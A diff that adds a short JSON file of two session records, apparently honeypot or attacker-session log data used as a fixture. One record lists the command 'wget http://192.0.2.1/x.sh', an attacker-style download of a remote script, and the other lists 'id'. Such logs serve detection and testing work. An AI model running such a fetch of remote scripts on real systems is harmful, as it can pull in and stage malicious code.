@@ -1,0 +1,12 @@
+[
+  {
+    "session_id": "bbeeff0202",
+    "commands": ["wget http://192.0.2.1/x.sh"],
+    "last_seen": "2026-08-26T13:00:02+00:00"
+  },
+  {
+    "session_id": "bbeeff0203",
+    "commands": ["id"],
+    "last_seen": "2026-08-26T13:10:01+00:00"
+  }
+]
